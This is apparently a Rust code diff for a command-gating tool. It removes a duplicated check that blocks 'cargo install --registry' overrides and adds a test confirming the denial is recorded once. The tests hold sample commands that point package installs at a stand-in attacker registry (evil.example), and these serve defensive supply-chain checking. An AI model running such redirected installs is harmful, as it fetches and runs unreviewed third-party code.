@@ -854,8 +854,12 @@ fn npm_registry_override_shape(line: &str) -> Vec<String> {
         })
     });
     let mut denies = Vec::new();
-    // Checked ahead of the npm-family guard, which returns early for a
-    // command with no npm manager anywhere in it.
+    // `cargo install --registry <url>` points the install at an alternative
+    // registry or a local path, so the reviewed crates.io bytes are not the
+    // bytes cargo fetches. Asked once per line, and ahead of the npm-family
+    // guard below, which returns early for a command with no npm manager
+    // anywhere in it: a check that also ran after that return recorded the
+    // same reason twice for a command carrying both a cargo and an npm token.
     if words
         .iter()
         .any(|w| matches!(manager_from_token(w), Some(RefManager::Cargo)))
@@ -893,23 +897,6 @@ fn npm_registry_override_shape(line: &str) -> Vec<String> {
                 break;
             }
         }
-    }
-    // `cargo install --registry <url>` points the install at an alternative
-    // registry or a local path, so the reviewed crates.io bytes are not the
-    // bytes cargo fetches.
-    let has_cargo = words
-        .iter()
-        .any(|w| matches!(manager_from_token(w), Some(RefManager::Cargo)));
-    if has_cargo
-        && words.iter().any(|w| matches!(*w, "install" | "i" | "add"))
-        && words
-            .iter()
-            .any(|w| *w == "--registry" || w.starts_with("--registry=") || *w == "--index")
-    {
-        denies.push(
-            "cargo --registry override would review crates.io and install from another source"
-                .to_string(),
-        );
     }
     denies
 }
@@ -1564,6 +1551,43 @@ mod tests {
         assert!(gate_hard_denies("npm install y").is_empty());
         assert!(gate_hard_denies("cargo install foo").is_empty());
         assert!(gate_hard_denies("PIP_INDEX_URL=https://evil.example echo hi").is_empty());
+    }
+
+    /// One reason per distinct problem. The `cargo --registry` check ran on
+    /// both sides of the npm-family guard, and the guard returns early only
+    /// for a command with no npm manager in it — so a mixed command hit the
+    /// same check twice and reported one problem twice. A pure-cargo command
+    /// took the early return and emitted one copy, which is why a non-empty
+    /// assertion never caught it.
+    #[test]
+    fn a_mixed_npm_cargo_command_records_the_cargo_denial_once() {
+        let mixed = gate_hard_denies(
+            "npm install x && cargo install --registry=https://evil.example serde",
+        );
+        assert!(
+            mixed
+                .iter()
+                .filter(|d| d.contains("cargo --registry"))
+                .count()
+                == 1,
+            "the cargo denial must be recorded once: {mixed:?}"
+        );
+        assert_eq!(
+            mixed.len(),
+            2,
+            "exactly the npm override and the cargo override: {mixed:?}"
+        );
+
+        let pure = gate_hard_denies("cargo install --registry=https://evil.example serde");
+        assert_eq!(pure.len(), 1, "{pure:?}");
+        assert!(pure[0].contains("cargo --registry"), "{pure:?}");
+
+        // Two cargo redirect flags on one line are still one question asked
+        // of the line, so they stay one reason.
+        let both = gate_hard_denies(
+            "cargo install --registry=https://evil.example --index=https://other.example serde",
+        );
+        assert_eq!(both.len(), 1, "{both:?}");
     }
 
     #[test]
